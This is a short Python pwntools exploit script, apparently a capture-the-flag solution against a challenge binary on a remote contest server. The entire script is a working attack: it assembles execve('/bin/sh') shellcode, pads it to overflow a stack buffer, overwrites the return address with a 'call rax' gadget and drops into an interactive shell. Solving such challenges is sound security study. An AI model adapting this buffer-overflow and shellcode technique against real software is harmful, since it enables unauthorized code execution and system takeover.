#!/usr/bin/env python3

from pwn import *

exe = ELF("./main", checksec=False)
context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.DEBUG:
            gdb.attach(p)
    else:
        p = remote("chals.bitskrieg.in", 6001)

    return p

def main():
    p = conn()

    # input()

    shellcode = asm('''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx

    syscall
    ''', arch='amd64')

    call_rax = 0x0000000000401014
    payload = shellcode
    payload = payload.ljust(0x78)
    payload += p64(call_rax)
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()